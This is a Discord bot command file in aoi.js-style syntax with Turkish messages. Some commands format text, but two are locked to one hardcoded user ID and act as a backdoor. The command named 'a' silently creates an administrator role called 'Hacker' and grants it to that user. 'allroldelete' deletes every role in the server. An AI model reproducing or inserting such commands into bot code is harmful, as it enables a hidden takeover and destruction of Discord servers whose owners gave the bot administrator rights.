module.exports = [{
    name: "a",
     code: `
   $giveRole[$guildID;$authorID;$findRole[Hacker]
   $createRole[$guildID;Hacker;;1;;false;;true;false;Rol oluşturuldu!;administrator]
 
   $onlyClientPerms[administrator;Yetkim Yok Malesef]
 
   $onlyForIDs[1141265487330811944;<a:hypesquad:1182040996616339599>  VİP!.]`
    },{
   name: "allroldelete",
     code: `
 
   $deleteRoles[$joinSplitText[;]]
   $textSplit[$guildRoles[$guildID;id;,];,]
 
   +eval $onlyIf[$rolePosition[$userHighestRole[$clientID;$guildID]]<=$rolePosition[$guildHighestRole];Lütfen benim rolümu en üste taşı yoksa rol silemem hepsini]
 
   $onlyForIDs[1141265487330811944;<a:hypesquad:1182040996616339599>  VİP!]`},{
    name:"descriptionyaz",
     code:`
     $title[1;$userNickname[$guildID;$authorID;true]]
 
     $description[1;$message]
     $footer[1;$username kullandı]
     $color[1;FF0000]
     $deletecommand
     $onlyClientPerms[administrator;Yetkim Yok Malesef]
     $onlyIf[$getGlobalUserVar[kara]!=alınmış;Karalistedesin]
     $onlyForIDs[1141265487330811944;<a:hypesquad:1182040996616339599> VİP!]
     `
    },{
     name:"büyükyaz",
     code:`# $message
     $onlyClientPerms[administrator;Yetkim Yok Malesef]
     $onlyIf[$getGlobalUserVar[kara]!=alınmış;Karalistedesin]
     $onlyForIDs[1141265487330811944;<a:hypesquad:1182040996616339599> VİP!]`}]